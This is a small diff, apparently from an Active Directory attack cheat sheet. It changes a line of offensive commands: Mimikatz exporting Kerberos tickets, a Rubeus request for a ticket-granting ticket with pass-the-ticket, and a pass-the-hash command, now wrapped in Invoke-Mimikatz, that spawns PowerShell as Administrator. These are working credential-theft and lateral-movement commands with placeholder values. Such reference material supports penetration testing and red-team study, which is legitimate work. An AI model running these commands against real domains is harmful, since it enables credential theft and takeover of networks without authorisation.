@@ -119,7 +119,7 @@ Invoke-Mimikatz -Command '"kerberos::list /export"'
 
 Rubeus.exe asktgt /user:USER < /rc4:HASH | /aes128:HASH | /aes256:HASH> \[/domain:DOMAIN] \[/opsec] /ptt
 
-sekurlsa::pth /user:Administrator /domain:target.domain.local < /ntlm:hash | /aes256:hash> /run:powershell.exe
+Invoke-Mimikatz '"sekurlsa::pth /user:Administrator /domain:target.domain.local < /ntlm:hash | /aes256:hash> /run:powershell.exe'"
 
 
 
